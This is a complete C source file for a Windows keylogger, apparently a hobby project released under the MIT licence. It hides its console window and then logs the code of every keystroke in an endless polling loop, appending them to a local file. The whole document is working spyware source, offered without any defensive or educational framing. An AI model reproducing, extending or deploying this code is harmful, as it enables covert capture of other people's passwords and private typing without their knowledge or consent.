/**
* Developer: Minhas Kamal (minhaskamal024@gmail.com)
* Date: 15.Aug.2014
* Website: https://minhaskamal.github.io/StupidKeylogger
* License: MIT License
* Intro: Logs all key strokes. I spent a whole day doing this little code. But it was really fun!
**/

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define FILE_NAME "Record.log"

main(){
    FreeConsole();  //window is not visible

    FILE *file = fopen(FILE_NAME, "a");  //open or create a file

    time_t date = time(NULL);   //write time and date in file
    fprintf(file, "0\n%s\t", ctime(&date)); //writing an extra '0' before every start which is used during decoding
    fclose(file);

    unsigned short ch, i;
    while(1){
        ch=1;
        while(ch<250){
            for(i=0; i<50; i++, ch++){  //this strange and extra loop provides more effectiveness and efficiency
                if(GetAsyncKeyState(ch) == -32767){ //when key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1);   //this little sleep inhibits the program from taking full processor cycle
        }
    }
}
